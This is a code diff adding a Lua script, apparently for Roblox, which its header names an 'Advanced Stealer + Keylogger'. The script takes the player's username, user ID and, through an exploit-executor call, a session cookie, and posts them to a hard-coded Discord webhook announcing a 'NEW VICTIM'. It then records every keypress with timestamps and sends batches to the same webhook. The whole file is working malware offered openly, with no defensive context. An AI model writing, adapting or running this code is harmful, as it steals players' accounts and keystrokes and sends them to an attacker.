@@ -1,0 +1,60 @@
+-- === ADVANCED ROBLOX STEALER + KEYLOGGER ===
+local http = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+
+local webhook = "https://discord.com/api/webhooks/1518762963253858364/697c14rZjwcH_fi2Z_uYg5cq134oHMSuAVRatue1PO4WN47ceoSrgvEpUZ3IJDSJa4cY"
+
+local function send(payload)
+    pcall(function()
+        http:PostAsync(webhook, http:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
+    end)
+end
+
+-- Initial Info
+local info = {
+    Username = LocalPlayer.Name,
+    UserId = LocalPlayer.UserId,
+    Time = os.date("%Y-%m-%d %H:%M:%S")
+}
+
+pcall(function()
+    if syn and syn.getcookie then
+        info.Cookie = syn.getcookie()
+    end
+end)
+
+send({
+    content = "@everyone **NEW VICTIM** - " .. LocalPlayer.Name,
+    embeds = {{
+        title = "Advanced Stealer",
+        fields = {
+            {name = "User", value = info.Username},
+            {name = "Cookie", value = "```" .. (info.Cookie or "N/A") .. "```"}
+        }
+    }}
+})
+
+-- Advanced Keylogger
+local loggedKeys = ""
+local lastSend = tick()
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    local key = tostring(input.KeyCode):gsub("Enum.KeyCode.", "")
+    loggedKeys = loggedKeys .. "[" .. os.date("%H:%M:%S") .. "] " .. key .. " "
+
+    if #loggedKeys > 180 or (tick() - lastSend > 7) then
+        if loggedKeys ~= "" then
+            send({
+                content = "**Keylog - " .. LocalPlayer.Name .. "**",
+                embeds = {{ description = "```" .. loggedKeys .. "```" }}
+            })
+            loggedKeys = ""
+            lastSend = tick()
+        end
+    end
+end)
+
+print("Advanced Stealer + Keylogger Loaded")
